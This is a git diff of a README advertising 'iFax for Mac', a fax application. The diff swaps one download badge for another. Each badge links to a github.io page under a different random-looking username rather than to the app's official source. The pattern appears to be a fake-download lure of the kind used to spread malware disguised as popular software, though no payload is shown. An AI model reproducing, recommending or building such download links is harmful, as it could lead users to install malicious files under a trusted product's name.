@@ -2,19 +2,15 @@
 
 <div align="center">  
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/b3/df/e1/b3dfe1c7-3a5f-d397-0ce5-4dcdd8d241bd/AppIcon-0-0-1x_U007epad-0-1-0-85-220.png/1200x630wa.png" alt="iFax Logo" width="256" height="256">  
-</div>  
-
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/ifax">  
-<img src="https://img.shields.io/badge/Download_iFax_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download iFax for Mac">  
-</a>  
-</div>  
+</div>   
 
 ---
 
 ## What is iFax for Mac?
 
 iFax Mac App is a professional software solution designed to replace traditional fax machines. It allows users to send and receive faxes securely directly from their macOS device. The application supports various file formats, including PDF, DOC, and JPG, making document handling effortless.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://cynara7dragonpk.github.io/.github/iFax-receive-faxes-directly)
 
 This tool is more than just a fax sender; it integrates advanced features like digital signatures, cloud storage connectivity (iCloud, Google Drive, Dropbox), and end-to-end encryption to ensure your sensitive documents are protected. Optimized for all Mac models, including MacBook Air, MacBook Pro, and iMac, iFax delivers a smooth and reliable performance, helping businesses and individuals maintain efficient paperless communication.
 
